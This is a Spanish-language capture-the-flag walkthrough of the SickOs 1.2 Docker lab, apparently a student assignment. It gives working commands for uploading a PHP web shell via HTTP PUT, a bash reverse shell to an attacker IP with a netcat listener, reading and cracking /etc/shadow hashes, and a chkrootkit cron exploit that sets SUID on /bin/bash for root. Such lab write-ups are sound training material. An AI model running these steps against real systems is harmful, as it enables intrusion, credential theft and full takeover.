# 🏴‍☠️ Walkthrough: SickOs 1.2 (Docker Lab)

## 👥 Componentes del grupo
- Javier Merino Pinedo  
- Alejandro Nagore Irigoyen  

---

## 🎯 Objetivo
- Obtener acceso inicial a la máquina objetivo.
- Leer la flag de usuario ubicada en `/home/sickos/user.txt`.
- Escalar privilegios hasta **root**.
- Leer la flag final ubicada en `/root/root.txt`.

---

## 🖥️ Preparativos (Máquina atacante)
Para completar el laboratorio se requieren **dos terminales abiertas** en la máquina atacante (Linux/WSL):

- **Terminal 1** 🧨: usada para reconocimiento y explotación (peticiones web, subida de ficheros).
- **Terminal 2** 🎧: usada como listener para recibir la conexión inversa.

---

## 🔎 FASE 1: Reconocimiento (Enumeración)
El primer paso es identificar qué servicios están expuestos en la máquina objetivo y analizar su configuración. Dado que actuamos en modo "caja negra" (sin conocer la infraestructura), comenzamos con un escaneo general.

### 1. Escaneo de Puertos
Ejecutamos `nmap` contra la IP objetivo para descubrir puertos abiertos y versiones de servicios.

```bash
nmap -p- -sV -sC localhost
```

Durante esta fase se analiza la superficie de ataque del servidor web.

```bash
wget https://raw.githubusercontent.com/v0re/dirb/master/wordlists/common.txt
gobuster dir -u http://localhost:8080 -w common.txt
```

Se identifica que el directorio `/test/` es accesible y potencialmente vulnerable.
El objetivo es comprobar si el servidor permite el método HTTP **PUT**, lo cual supondría una mala configuración de seguridad.
### 📌 Comando
```bash
curl -v -X OPTIONS http://localhost:8080/test/
```
Como el método **PUT** está habilitado, es posible subir archivos directamente al servidor, abriendo la puerta a la explotación.

---

## 🔓 FASE 2: Acceso Inicial (Reverse Shell)
Confirmada la vulnerabilidad, se procede a obtener acceso remoto al sistema.

1. Se identifica la dirección IP de la máquina atacante, que actuará como destino de la conexión inversa.
```bash
ip addr show eth0
```
Copia tu IP obtenida e introdúcela donde veas TU_IP.
2. Se prepara un payload que fuerza al servidor a iniciar una **reverse shell**.
```bash
echo "bash -i >& /dev/tcp/TU_IP/4444 0>&1" > rev.sh
```
3. Se crea un archivo PHP que permite ejecutar acciones en el servidor a través de peticiones web.
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```
4. Ambos archivos se suben al directorio vulnerable `/test/` aprovechando el método PUT.
```bash
curl -v -T rev.sh http://localhost:8080/test/rev.sh
curl -v -T shell.php http://localhost:8080/test/shell.php
```
4. Como alternativa, puedes subir los ficheros al directorio vulnerable sin crear archivos peligrosos en tu ordenador.
```bash
curl -v -X PUT --data 'bash -i >& /dev/tcp/TU_IP/4444 0>&1' http://localhost:8080/test/rev.sh
curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://localhost:8080/test/shell.php
```
5. En la terminal 2, se pone a la escucha en el puerto configurado en la **reverse shell** del paso 2.
```bash
nc -lvnp 4444
```
6. Se ejecuta el archivo PHP, provocando que la víctima se conecte de vuelta.
```bash
curl "http://localhost:8080/test/shell.php?cmd=bash%20/var/www/html/test/rev.sh"
```
Como resultado, se obtiene una shell con el usuario **www-data**, con privilegios limitados.
7. Navega hasta el directorio donde se encuentra la primera flag.
```bash
cd /home/sickos
ls
cat flag.txt
```

---

## 🧗 FASE 3: Movimiento Lateral (Robo de Credenciales)
Aquí intentamos escalar privilegios, pero encontramos un obstáculo.

1. Intento fallido: Al enumerar el sistema, vemos que hay tareas programadas relacionadas con chkrootkit. Normalmente intentaríamos escribir un exploit en /tmp/updates, pero:

```bash
ls -ld /tmp/updates
```
El directorio pertenece a user1 y www-data no tiene permisos de escritura. No podemos escalar directamente.

2. Enumeración de archivos sensibles: Buscamos configuraciones erróneas en archivos del sistema.

```bash
ls -l /etc/shadow
```
¡Vulnerabilidad! El grupo www-data puede leer el archivo de contraseñas shadow.

3. Robo del Hash: Extraemos el hash del usuario objetivo:

```bash
grep user1 /etc/shadow
```

Copiamos la línea entera y la guardamos en nuestra máquina local como hash.txt.

4. Cracking Offline (John the Ripper): Necesitarás tener descargado rockyou.txt.
Nota:Puedes usar tu crackeador favorito

```bash
john-the-ripper --wordlist=rockyou.txt hash.txt
```

Resultado: Contraseña encontrada -> rockyou

5. Conexión SSH: Nos conectamos con user1. Se expone el SSH en el puerto 2222.

```bash
ssh -p 2222 user1@localhost
# Password: rockyou
```
6. Captura de Flag: Ya autenticado, podemos ller la flag protegida:

```bash
cat /home/user1/user.txt
```

---

## 🧗 FASE 4: Escalada de Privilegios (Becoming Root)
Con acceso inicial al sistema, se inicia la fase de escalada de privilegios.

Se detecta que el sistema utiliza una versión vulnerable de **chkrootkit (0.49)** y que este se ejecuta automáticamente mediante tareas programadas.
```bash
/usr/sbin/chkrootkit -V
ls -la /etc/cron.d/
```
Esta versión presenta una vulnerabilidad que permite ejecutar un archivo llamado `update` ubicado en `/tmp/updates` con privilegios de administrador.

Aprovechando este comportamiento, se crea un archivo malicioso que modifica los permisos del binario `/bin/bash`, activando el bit **SUID**.
```bash
cd /tmp/updates
echo -e '#!/bin/bash\nchmod u+s /bin/bash' > update
chmod +x update
```
Ahora sólo habrá que esperar un minuto y cuando la tarea programada se ejecuta, el binario queda preparado para permitir la elevación de privilegios.

---

## 🏆 FASE 5: Looting (Victoria)
Tras la ejecución de la tarea programada:

- Se comprueba que `/bin/bash` tiene el bit **SUID** activo.
```bash
ls -la /bin/bash
```
Resultado esperado:
```bash
-rwsr-xr-x
```
- Se lanza una shell con privilegios elevados.
```bash
/bin/bash -p
whoami
```
- Se obtiene acceso completo como **root**.

Finalmente, se accede a las flags del root:
```bash
cd /root
ls
cat root.txt
```

🏴‍☠️ **¡Máquina completamente comprometida!**

---
